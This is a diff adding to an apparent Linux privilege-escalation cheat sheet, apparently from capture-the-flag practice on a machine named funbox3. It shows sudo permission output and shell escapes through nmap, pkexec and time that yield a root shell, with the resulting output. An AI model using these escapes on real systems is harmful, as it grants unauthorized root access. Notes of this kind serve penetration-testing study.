@@ -15,6 +15,24 @@ sudo -l
 # Google the application you can run as root, eg. nmap privilege escalation
 sudo nmap --interactive
 nmap> !sh
+```
+```
+# If you get something like
+User tony may run the following commands on funbox3:
+    (root) NOPASSWD: /usr/bin/rlogin
+    (root) NOPASSWD: /usr/bin/pkexec
+    (root) NOPASSWD: /usr/bin/mtr
+    (root) NOPASSWD: /usr/bin/finger
+    (root) NOPASSWD: /usr/bin/time
+# Try the following
+tony@funbox3:~$ sudo /usr/bin/pkexec /bin/sh
+$ whoami
+root
+
+# Can also do.. Just make sure the application is there with 'which time'
+tony@funbox3:~$ sudo /usr/bin/time /bin/sh
+$ whoami
+root
 ``` 
 #### Check which version/year of Linux for privesc exploits
 ```
